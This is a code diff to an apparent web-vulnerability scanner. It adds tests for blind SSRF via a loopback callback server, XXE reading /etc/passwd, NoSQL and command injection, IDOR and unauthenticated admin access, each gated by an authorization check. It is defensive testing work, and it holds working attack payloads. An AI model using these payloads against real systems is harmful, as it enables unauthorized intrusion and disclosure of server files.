@@ -20,10 +20,13 @@ from __future__ import annotations
 
 import concurrent.futures
 import statistics
+import threading
 import time
 import urllib.error
 import urllib.request
+import uuid
 from dataclasses import dataclass, field
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from typing import Dict, List, Optional
 from urllib.parse import urlencode, urlparse, urlunparse
 
@@ -44,13 +47,70 @@ def _ensure_authorized(url: str, allow_remote: bool) -> None:
             "only for targets you are authorized to test.")
 
 
-def _fetch(url: str, timeout: float = 10.0):
-    req = urllib.request.Request(url, headers={"User-Agent": "sentinel-dast/1.0"})
+def _fetch(url: str, timeout: float = 10.0, headers: Optional[dict] = None):
+    h = {"User-Agent": "sentinel-dast/1.0"}
+    h.update(headers or {})
+    req = urllib.request.Request(url, headers=h)
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with urllib.request.urlopen(req, timeout=timeout) as r:  # nosec ssrf: DAST client fetches user-supplied targets by design
             return r.getcode(), dict(r.headers), r.read().decode("utf-8", "ignore")
     except urllib.error.HTTPError as e:
         return e.code, dict(e.headers or {}), e.read().decode("utf-8", "ignore")
+
+
+def _post(url: str, data: str, content_type: str = "application/xml", timeout: float = 10.0):
+    req = urllib.request.Request(
+        url, data=data.encode(), method="POST",
+        headers={"User-Agent": "sentinel-dast/1.0", "Content-Type": content_type})
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:  # nosec ssrf: DAST client fetches user-supplied targets by design
+            return r.getcode(), r.read().decode("utf-8", "ignore")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "ignore")
+
+
+class CallbackServer:
+    """A loopback out-of-band (OOB) 'collaborator' — records tokens it is hit with.
+
+    Used to *confirm* blind SSRF/XXE: we hand the target a unique callback URL; if
+    the target's server-side request reaches this collaborator, the vulnerability
+    is proven (no reflection needed). Binds to 127.0.0.1 only.
+    """
+
+    def __init__(self):
+        self.hits: set = set()
+        outer = self
+
+        class _H(BaseHTTPRequestHandler):
+            def log_message(self, *a):
+                pass
+
+            def do_GET(self):
+                outer.hits.add(self.path.strip("/"))
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"ok")
+
+        self.server = ThreadingHTTPServer(("127.0.0.1", 0), _H)
+        self.port = self.server.server_address[1]
+        self.base_url = f"http://127.0.0.1:{self.port}"
+        self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+
+    def __enter__(self):
+        self._thread.start()
+        return self
+
+    def __exit__(self, *exc):
+        self.server.shutdown()
+        self.server.server_close()
+
+    def saw(self, token: str, wait: float = 1.0) -> bool:
+        deadline = time.time() + wait
+        while time.time() < deadline:
+            if token in self.hits:
+                return True
+            time.sleep(0.02)
+        return token in self.hits
 
 
 # --------------------------------------------------------------------------- #
@@ -153,6 +213,9 @@ INJECTION_TESTS = [
      [("../../../../etc/passwd", "root:x:0:0")]),
     ("command_injection", "CWE-78", "A03:2021-Injection",
      [("127.0.0.1; id", "uid=0("), ("127.0.0.1$(id)", "uid=0(")]),
+    ("nosql_injection", "CWE-943", "A03:2021-Injection",
+     [("{\"$ne\": null}", "auth bypassed"), ("' || '1'=='1", "auth bypassed"),
+      ("[$ne]=x", "auth bypassed")]),
 ]
 
 
@@ -182,6 +245,99 @@ class InjectionTester:
 
     def confirmed(self, base_url: str, path: str, param: str) -> List[ExploitResult]:
         return [r for r in self.test(base_url, path, param) if r.confirmed]
+
+    # -- out-of-band SSRF (blind, confirmed via callback) ------------------ #
+
+    def test_ssrf_oob(self, base_url: str, path: str, param: str) -> ExploitResult:
+        _ensure_authorized(base_url, self.allow_remote)
+        parsed = urlparse(base_url)
+        with CallbackServer() as cb:
+            token = uuid.uuid4().hex
+            payload = f"{cb.base_url}/{token}"
+            url = urlunparse((parsed.scheme, parsed.netloc, path, "",
+                              urlencode({param: payload}), ""))
+            _fetch(url)
+            hit = cb.saw(token, wait=1.5)
+        return ExploitResult(
+            "ssrf", param, payload, hit,
+            evidence=f"callback {token} received" if hit else "",
+            cwe="CWE-918", owasp="A10:2021-Server-Side Request Forgery")
+
+    # -- XXE over HTTP (POST an XML body with an external entity) ---------- #
+
+    XXE_PAYLOAD = ('<?xml version="1.0"?>'
+                   '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+                   '<r>&xxe;</r>')
+
+    def test_xxe(self, base_url: str, path: str = "/xml") -> ExploitResult:
+        _ensure_authorized(base_url, self.allow_remote)
+        parsed = urlparse(base_url)
+        url = urlunparse((parsed.scheme, parsed.netloc, path, "", "", ""))
+        _, body = _post(url, self.XXE_PAYLOAD, content_type="application/xml")
+        hit = "root:x:0:0" in body
+        return ExploitResult("xxe", "body", self.XXE_PAYLOAD, hit,
+                             evidence=body[:200] if hit else "",
+                             cwe="CWE-611", owasp="A05:2021-Security Misconfiguration")
+
+    # -- IDOR: same request, different object id, no authorization -------- #
+
+    def test_idor(self, base_url: str, path: str = "/account", param: str = "id",
+                  ids=(1001, 1002)) -> ExploitResult:
+        _ensure_authorized(base_url, self.allow_remote)
+        parsed = urlparse(base_url)
+        bodies = []
+        for i in ids:
+            url = urlunparse((parsed.scheme, parsed.netloc, path, "",
+                              urlencode({param: i}), ""))
+            code, _, body = _fetch(url)
+            bodies.append((code, body))
+        # confirmed if every object is returned (200 + owner marker) without auth
+        # and the objects are distinct (i.e. we read *other* users' records).
+        hit = (all(c == 200 and "owner=" in b for c, b in bodies)
+               and len({b for _, b in bodies}) == len(bodies))
+        return ExploitResult("idor", param, f"{param}={list(ids)}", hit,
+                             evidence=bodies[0][1][:120] if hit else "",
+                             cwe="CWE-639", owasp="A01:2021-Broken Access Control")
+
+    # -- auth bypass / broken access control ------------------------------ #
+
+    def test_auth_bypass(self, base_url: str, path: str = "/admin",
+                         admin_marker: str = "ADMIN PANEL") -> ExploitResult:
+        _ensure_authorized(base_url, self.allow_remote)
+        parsed = urlparse(base_url)
+        url = urlunparse((parsed.scheme, parsed.netloc, path, "", "", ""))
+        code, _, body = _fetch(url)  # no credentials sent
+        hit = code == 200 and admin_marker in body
+        return ExploitResult("auth_bypass", "-", f"GET {path} (no auth)", hit,
+                             evidence=body[:120] if hit else "",
+                             cwe="CWE-862", owasp="A01:2021-Broken Access Control")
+
+    # -- full battery against the bundled mock target layout -------------- #
+
+    def full_scan(self, base_url: str) -> List[ExploitResult]:
+        """Run every technique against the conventional mock-target endpoints.
+
+        Returns one :class:`ExploitResult` per technique (reflected classes take
+        their first confirmed payload). Intended for the bundled mock app.
+        """
+        out: List[ExploitResult] = []
+        reflected = [
+            ("/search", "q", "xss"),
+            ("/user", "id", "sql_injection"),
+            ("/render", "name", "ssti"),
+            ("/file", "path", "path_traversal"),
+            ("/ping", "host", "command_injection"),
+            ("/nlogin", "pw", "nosql_injection"),
+        ]
+        for path, param, cat in reflected:
+            hits = [r for r in self.test(base_url, path, param, [cat]) if r.confirmed]
+            out.append(hits[0] if hits else
+                       ExploitResult(cat, param, "", False, cwe="", owasp=""))
+        out.append(self.test_ssrf_oob(base_url, "/fetch", "url"))
+        out.append(self.test_xxe(base_url, "/xml"))
+        out.append(self.test_idor(base_url, "/account", "id"))
+        out.append(self.test_auth_bypass(base_url, "/admin"))
+        return out
 
 
 # --------------------------------------------------------------------------- #
